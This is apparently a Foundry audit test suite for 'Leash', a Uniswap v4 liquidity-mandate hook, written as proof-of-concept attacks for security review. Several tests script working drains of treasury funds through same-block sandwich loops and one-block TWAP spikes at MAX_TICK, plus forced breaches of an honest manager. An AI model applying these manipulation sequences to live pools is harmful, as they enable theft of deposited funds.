// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {Deployers} from "@uniswap/v4-core/test/utils/Deployers.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";
import {Hooks} from "v4-core/libraries/Hooks.sol";
import {LPFeeLibrary} from "v4-core/libraries/LPFeeLibrary.sol";
import {StateLibrary} from "v4-core/libraries/StateLibrary.sol";
import {TickMath} from "v4-core/libraries/TickMath.sol";
import {IHooks} from "v4-core/interfaces/IHooks.sol";
import {PoolKey} from "v4-core/types/PoolKey.sol";
import {PoolIdLibrary} from "v4-core/types/PoolId.sol";
import {Currency} from "v4-core/types/Currency.sol";
import {SwapParams} from "v4-core/types/PoolOperation.sol";
import {PoolSwapTest} from "v4-core/test/PoolSwapTest.sol";
import {LiquidityAmounts} from "v4-periphery/src/libraries/LiquidityAmounts.sol";
import {Leash, Terms, Position, Mandate, EpochRecord} from "../../src/Leash.sol";

/// Audit PoCs. Each test asserts the property Leash is meant to guarantee; a failure is the finding.
/// Same setup as test/Leash.t.sol: 100/100 inventory at 1:1, position [-600, 600) L=1000e18, bond 10e18 in currency1
/// (the stablecoin), TWAP window 1800s, maxTickDeviation 100, minLiquidity 100e18, uptime 95%.
contract LeashAuditTest is Test, Deployers {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for *;

    uint160 constant FLAGS =
        uint160(Hooks.BEFORE_INITIALIZE_FLAG | Hooks.BEFORE_ADD_LIQUIDITY_FLAG | Hooks.BEFORE_SWAP_FLAG);

    Leash leash;
    address alice = makeAddr("alice"); // manager
    address eve = makeAddr("eve"); // outsider
    uint40 auctionEnd;

    function setUp() public {
        deployFreshManagerAndRouters();
        (currency0, currency1) = deployMintAndApprove2Currencies();

        address hook = address(FLAGS ^ (0x4444 << 144));
        deployCodeTo("Leash.sol:Leash", abi.encode(manager), hook);
        leash = Leash(hook);
        key = PoolKey(currency0, currency1, LPFeeLibrary.DYNAMIC_FEE_FLAG, 60, IHooks(hook));

        _approveAll(address(this));
        auctionEnd = uint40(block.timestamp + 1 days);
        leash.createMandate(key, SQRT_PRICE_1_1, _terms(), 100e18, 100e18, Position(-600, 600, 1_000e18));

        address[2] memory who = [alice, eve];
        for (uint256 i; i < 2; i++) {
            MockERC20(Currency.unwrap(currency0)).mint(who[i], 1_000e18);
            MockERC20(Currency.unwrap(currency1)).mint(who[i], 1_000e18);
            vm.startPrank(who[i]);
            _approveAll(who[i]);
            vm.stopPrank();
        }
    }

    function _approveAll(address) internal {
        address[2] memory spenders = [address(leash), address(swapRouter)];
        for (uint256 i; i < 2; i++) {
            MockERC20(Currency.unwrap(currency0)).approve(spenders[i], type(uint256).max);
            MockERC20(Currency.unwrap(currency1)).approve(spenders[i], type(uint256).max);
        }
    }

    function _terms() internal view returns (Terms memory) {
        return Terms({
            stableIs0: false,
            maxFee: 10_000,
            auctionEnd: auctionEnd,
            epochLength: 1 days,
            epochs: 3,
            minBond: 10e18,
            twapWindow: 1800,
            maxTickDeviation: 100,
            minLiquidity: 100e18,
            uptimeBps: 9500,
            managerFeeBps: 3000,
            startStableBps: 10_000,
            endStableBps: 10_000
        });
    }

    function _m() internal view returns (Mandate memory) {
        return leash.mandate(key.toId());
    }

    function _bal(Currency c, address who) internal view returns (uint256) {
        return MockERC20(Currency.unwrap(c)).balanceOf(who);
    }

    /// Value at the 1:1 market price.
    function _value(address who) internal view returns (uint256) {
        return _bal(currency0, who) + _bal(currency1, who);
    }

    function _tick() internal view returns (int24 tick) {
        (, tick,,) = manager.getSlot0(key.toId());
    }

    function _sqrt(int24 t) internal pure returns (uint160) {
        return TickMath.getSqrtPriceAtTick(t);
    }

    /// `who` swaps (exact output, effectively unlimited) until the price reaches `limit`.
    function _swapAs(address who, bool zeroForOne, uint160 limit) internal {
        vm.prank(who);
        swapRouter.swap(key, SwapParams(zeroForOne, 1e30, limit), PoolSwapTest.TestSettings(false, false), ZERO_BYTES);
    }

    function _swapToTick(address who, int24 t) internal {
        _swapAs(who, t < _tick(), _sqrt(t));
    }

    function _win() internal {
        vm.prank(alice);
        leash.bid(key, 10e18);
        vm.warp(auctionEnd);
        leash.checkpoint(key);
    }

    function _next(uint256 secs) internal {
        vm.warp(block.timestamp + secs);
        vm.roll(block.number + 1);
    }

    // ================================================================ C-1

    /// C-1. The manager sandwiches its own rebalance, many times inside one transaction. The guard compares spot to a
    /// TWAP that cannot move within a block, so every cycle passes: push spot +100 ticks through a min-liquidity
    /// position (almost free), re-place all inventory just behind spot, sell back to market into it, shrink again;
    /// then the mirror image. Each half-cycle buys/sells the treasury's whole side at ~0.5% off market, and the
    /// position never leaves compliance, so the bond is safe and the epoch settles clean.
    function test_C1_managerDrainsBySameBlockSandwichLoop() public {
        vm.skip(true); // rewritten as a regression once the anchor, width, fee floor, same-block and oracle fixes land
        _win();
        vm.prank(alice);
        leash.setFee(key, 0);
        vm.prank(alice);
        leash.rebalance(key, -60, 60, 100e18);

        uint256 before = _value(alice);
        uint256 gasStart = gasleft();
        uint256 cycles = 25;
        for (uint256 i; i < cycles; i++) {
            // Up: spot to +60, all currency1 into [0, 60) (spot on its upper edge: needs no currency0),
            // sell currency0 back to market into it: the treasury buys currency0 ~0.3% above market.
            _swapToTick(alice, 60);
            uint128 l1 = LiquidityAmounts.getLiquidityForAmount1(_sqrt(0), _sqrt(60), _m().idle1) * 99 / 100;
            vm.prank(alice);
            leash.rebalance(key, 0, 60, l1);
            _swapToTick(alice, 0);
            vm.prank(alice);
            leash.rebalance(key, -60, 60, 100e18);
            // Down: spot to -60, all currency0 into [-60, 60) (spot on its lower edge: needs no currency1),
            // buy currency0 back to market: the treasury sells currency0 below market.
            _swapToTick(alice, -60);
            uint128 l0 = LiquidityAmounts.getLiquidityForAmount0(_sqrt(-60), _sqrt(60), _m().idle0) * 99 / 100;
            vm.prank(alice);
            leash.rebalance(key, -60, 60, l0);
            _swapToTick(alice, 0);
            vm.prank(alice);
            leash.rebalance(key, -60, 60, 100e18);
        }
        emit log_named_uint("gas per full cycle", (gasStart - gasleft()) / cycles);
        uint256 gain = _value(alice) - before;
        emit log_named_decimal_uint("manager gain in one tx (tokens at 1:1)", gain, 18);
        assertEq(leash.twapTick(key), 0, "TWAP never moved");

        // The epoch stays clean: the manager keeps the bond and is paid on top.
        vm.warp(auctionEnd + 1 days);
        leash.settle(key, 0);
        assertTrue(leash.epochRecord(key.toId(), 0).clean, "epoch clean");
        assertEq(_m().bond, 10e18, "bond intact");

        assertLe(gain, 1e18, "manager extracted treasury inventory");
    }

    // ================================================================ C-2

    /// C-2. Outside the hook's own range the pool has no liquidity, so the price can be parked at MAX_TICK for free.
    /// One 12s block there adds 887271*12 to the tick accumulator: the 30-min TWAP jumps to ~5915 (x1.8). The manager
    /// then moves spot down to that TWAP (still free), so |spot - TWAP| = 0 and the guard passes; re-places the
    /// whole inventory in [0, ~5940) and sells currency0 down to market into it, buying the stablecoin at up to 1.8x.
    /// The new range still holds the TWAP as it decays back to 0, so the epoch stays clean.
    function test_C2_managerDrainsByParkingPriceAtMaxTickForOneBlock() public {
        vm.skip(true); // rewritten as a regression once the anchor, width, fee floor, same-block and oracle fixes land
        _win();
        vm.startPrank(alice);
        leash.setFee(key, 0);
        leash.rebalance(key, -60, 60, 100e18); // a minimal position makes the push nearly free
        vm.stopPrank();
        uint256 before = _value(alice);

        _swapAs(alice, false, TickMath.MAX_SQRT_PRICE - 1); // through the dust position, then free to MAX_TICK
        _next(12);
        int24 t = leash.twapTick(key);
        emit log_named_int("TWAP after one block at MAX_TICK", t);
        _swapToTick(alice, t); // writes the observation; free fall to the TWAP
        int24 hi = (t / 60 + 1) * 60;
        Mandate memory m = _m();
        uint128 l = LiquidityAmounts.getLiquidityForAmounts(_sqrt(t), _sqrt(0), _sqrt(hi), m.idle0, m.idle1) * 99 / 100;
        vm.prank(alice);
        leash.rebalance(key, 0, hi, l); // passes the guard: spot == TWAP
        _swapToTick(alice, 1); // sell currency0 into the treasury's bid, back to market (tick 1 stays inside the range)

        uint256 gain = _value(alice) - before;
        emit log_named_decimal_uint("manager gain (tokens at 1:1)", gain, 18);

        // Keeper every minute for the rest of the epoch: still clean, bond kept.
        while (block.timestamp + 1 minutes <= auctionEnd + 1 days) {
            _next(1 minutes);
            leash.checkpoint(key);
        }
        vm.warp(auctionEnd + 1 days);
        leash.settle(key, 0);
        assertTrue(leash.epochRecord(key.toId(), 0).clean, "epoch clean");
        assertEq(_m().bond, 10e18, "bond intact");

        assertLe(gain, 1e18, "manager extracted treasury inventory");
    }

    // ================================================================ H-1

    function _keep(uint256 until) internal {
        while (block.timestamp + 1 minutes <= until) {
            _next(1 minutes);
            leash.checkpoint(key);
        }
    }

    /// One block parked at MAX_TICK and straight back: the TWAP sits out of range for ~30 min.
    function _spike() internal {
        _swapAs(eve, false, TickMath.MAX_SQRT_PRICE - 1);
        _next(12);
        _swapToTick(eve, 0);
    }

    /// H-1. Anyone (the treasury above all, since it receives the bond) breaches an honest manager for the cost of
    /// three round trips through one side of the treasury's own position. Each spike holds the 30-min TWAP at ~5915
    /// for a full window; the manager can't re-range because spot is back at market, far from the TWAP. A keeper
    /// checkpointing every minute doesn't help: the TWAP really is out of range. 3 x 30 min > the 72 min allowed.
    function test_H1_outsiderForcesBreachWithThreeOneBlockSpikes() public {
        vm.skip(true); // rewritten as a regression once the anchor, width, fee floor, same-block and oracle fixes land
        _win();
        uint256 before = _value(eve);
        for (uint256 i; i < 3; i++) {
            _keep(block.timestamp + 1 hours);
            _spike();
            if (i == 0) {
                vm.prank(alice);
                vm.expectRevert(Leash.SpotOffTwap.selector);
                leash.rebalance(key, -600, 600, 1_000e18); // the manager can't defend
            }
        }
        _keep(auctionEnd + 1 days);
        uint256 cost = before - _value(eve);
        emit log_named_decimal_uint("attacker cost (tokens at 1:1)", cost, 18);
        vm.warp(auctionEnd + 1 days);
        leash.settle(key, 0);
        EpochRecord memory e = leash.epochRecord(key.toId(), 0);
        emit log_named_uint("outSecs", e.outSecs);
        emit log_named_decimal_uint("bond to the treasury", leash.owed(address(this), currency1), 18);
        assertTrue(e.clean, "an always-in-range manager was breached");
    }

    // ================================================================ M-1

    /// M-1. solmate's SafeTransferLib doesn't check for code, so `_pull` of a token that isn't deployed yet succeeds
    /// without moving anything and the mandate is credited. With the opening price exactly on the initial range's lower
    /// tick, the position needs none of currency1, so the mandate is created. Once the token is deployed at its
    /// predictable (CREATE2 / bridge-factory) address and another treasury deposits it, the attacker closes and walks
    /// away with that treasury's tokens; the victim's own close then reverts.
    /// Fixed: createMandate requires code at both currencies, so the phantom mandate can't be opened.
    function test_M1_phantomDepositOfUndeployedTokenDrainsOtherMandates() public {
        address phantom = address(type(uint160).max - 0x1234); // sorts above currency0; no code yet
        PoolKey memory a = PoolKey(currency0, Currency.wrap(phantom), LPFeeLibrary.DYNAMIC_FEE_FLAG, 60, key.hooks);
        vm.prank(eve);
        vm.expectRevert(Leash.NotLeashPool.selector);
        leash.createMandate(a, SQRT_PRICE_1_1, _terms(), 100e18, 50e18, Position(0, 600, 1_000e18));

        // Once the token really exists, the same mandate works and is backed by real transfers.
        MockERC20 real = new MockERC20("P", "P", 18);
        vm.etch(phantom, address(real).code);
        MockERC20(phantom).mint(eve, 100e18);
        vm.startPrank(eve);
        MockERC20(phantom).approve(address(leash), type(uint256).max);
        leash.createMandate(a, SQRT_PRICE_1_1, _terms(), 100e18, 50e18, Position(-600, 600, 1_000e18));
        vm.stopPrank();
        assertEq(MockERC20(phantom).balanceOf(eve), 50e18, "the deposit was really pulled");
    }

    // ================================================================ M-2

    /// M-2. The bond only ever comes back inside close(), which only the treasury can call. After a fully clean
    /// mandate, every epoch settled by a third party, the manager has its pay but no route to its bond: a treasury
    /// that never closes (lost keys, a governance contract without the call, extortion, a USDC-blacklisted treasury
    /// whose close() reverts on the transfer) locks it forever.
    /// Fixed: settling the final epoch clean credits the bond to the manager, so this now holds.
    function test_M2_cleanManagersBondIsHostageToTreasuryClose() public {
        _win();
        vm.warp(auctionEnd + 3 days);
        for (uint256 e; e < 3; e++) {
            vm.prank(eve);
            leash.settle(key, e);
        }
        assertEq(_m().settled, 3);
        assertFalse(_m().breached);

        vm.startPrank(alice);
        vm.expectRevert(Leash.NotTreasury.selector);
        leash.close(key);
        vm.expectRevert(Leash.BadEpoch.selector);
        leash.settle(key, 3);
        leash.claim(currency1);
        vm.stopPrank();
        assertEq(_bal(currency1, alice), 1_000e18, "clean manager has its bond back");
        assertEq(_m().bond, 0);

        // The treasury's later close owes the manager nothing more.
        leash.close(key);
        assertEq(leash.owed(alice, currency1), 0, "no double refund");
    }

    // ================================================================ L-1

    /// L-1, fixed: at most 104 epochs. close() with all 104 unsettled (one checkpoint booking every epoch, then
    /// 104 settles, each poking the position) stays under the EIP-7825 per-transaction cap of 2^24 gas.
    function test_L1_closeAfter365UnsettledEpochsExceedsTxGasCap() public {
        key = PoolKey(currency0, currency1, LPFeeLibrary.DYNAMIC_FEE_FLAG, 10, IHooks(address(leash)));
        Terms memory t = _terms();
        (t.epochs, t.epochLength) = (365, 1 hours);
        vm.expectRevert(Leash.BadTerms.selector);
        leash.createMandate(key, SQRT_PRICE_1_1, t, 100e18, 100e18, Position(-600, 600, 1_000e18));
        t.epochs = 104;
        leash.createMandate(key, SQRT_PRICE_1_1, t, 100e18, 100e18, Position(-600, 600, 1_000e18));
        vm.prank(alice);
        leash.bid(key, 10e18);
        vm.warp(auctionEnd + 105 hours);
        uint256 g = gasleft();
        leash.close(key);
        uint256 used = g - gasleft();
        emit log_named_uint("close() gas, 104 unsettled epochs", used);
        assertLt(used, 1 << 24, "close fits under the EIP-7825 tx gas cap");
        assertEq(_m().settled, 104);
    }

    // ================================================================ coverage: post-end judging

    /// Safe: checkpoints after the end judge [lastCheck, end) by the state at that time, while the manager is locked
    /// out. But any price move needs a swap, and its beforeSwap checkpoints before moving, so a post-end move can't
    /// re-judge the final interval.
    function test_safe_postEndMoveCannotRejudgeFinalInterval() public {
        _win();
        _keep(auctionEnd + 3 days - 2 hours);
        vm.warp(auctionEnd + 3 days + 1); // mandate over; a genuine move happens
        _swapToTick(eve, 900);
        vm.prank(alice);
        vm.expectRevert(Leash.NotActive.selector);
        leash.rebalance(key, 600, 1200, 1_000e18);
        _next(1 hours);
        leash.close(key);
        EpochRecord memory e = leash.epochRecord(key.toId(), 2);
        emit log_named_uint("final epoch outSecs", e.outSecs);
        assertTrue(e.clean, "manager breached for a move that happened after the mandate ended");
    }

    // ================================================================ coverage: oracle ring buffer

    uint32[] obsTime;
    int24[] obsTickAfter; // tick in force after obsTime[k]

    /// Integral of the tick over (from, now], from the recorded history. Floor division, like _twap.
    function _refTwap(uint256 window) internal view returns (int24) {
        uint256 n = obsTime.length;
        uint256 oldest = n > 1024 ? obsTime[n - 1024] : obsTime[0];
        uint256 from = block.timestamp - window < oldest ? oldest : block.timestamp - window;
        int256 sum;
        for (uint256 k; k < n; k++) {
            uint256 a = obsTime[k];
            uint256 b = k + 1 < n ? obsTime[k + 1] : block.timestamp;
            if (b <= from) continue;
            if (a < from) a = from;
            sum += int256(obsTickAfter[k]) * int256(b - a);
        }
        int256 dt = int256(block.timestamp - from);
        int256 q = sum / dt;
        if (sum < 0 && sum % dt != 0) q--;
        return int24(q);
    }

    /// Safe: 1,200 swaps in 1,200 blocks (wraps the 1024-slot buffer) with uneven gaps; the TWAP matches a
    /// brute-force reference at many query points, including window edges and the shortened-history case.
    function test_safe_oracleWraparoundMatchesReference() public {
        _win();
        vm.prank(alice);
        leash.setFee(key, 0);
        obsTime.push(uint32(block.timestamp - 1 days)); // creation observation
        obsTickAfter.push(0);
        // _win's checkpoint wrote no observation; the first swap below writes one at its block.
        uint256 seed = 1;
        for (uint256 i; i < 1200; i++) {
            seed = uint256(keccak256(abi.encode(seed)));
            _next(i < 600 ? 1 + seed % 3 : 1); // 1s blocks at the end: held history (~1450s) < window

            obsTime.push(uint32(block.timestamp));
            int24 to = int24(int256(seed >> 8) % 500);
            _swapToTick(eve, to == _tick() ? to + 1 : to);
            obsTickAfter.push(_tick());
            if (i % 97 == 0 || i > 1190) assertEq(leash.twapTick(key), _refTwap(1800), "twap after swap");
        }
        uint256[6] memory gaps = [uint256(0), 1, 7, 600, 1799, 1801];
        for (uint256 j; j < gaps.length; j++) {
            vm.warp(block.timestamp + gaps[j]);
            assertEq(leash.twapTick(key), _refTwap(1800), "twap after quiet gap");
        }
    }
}
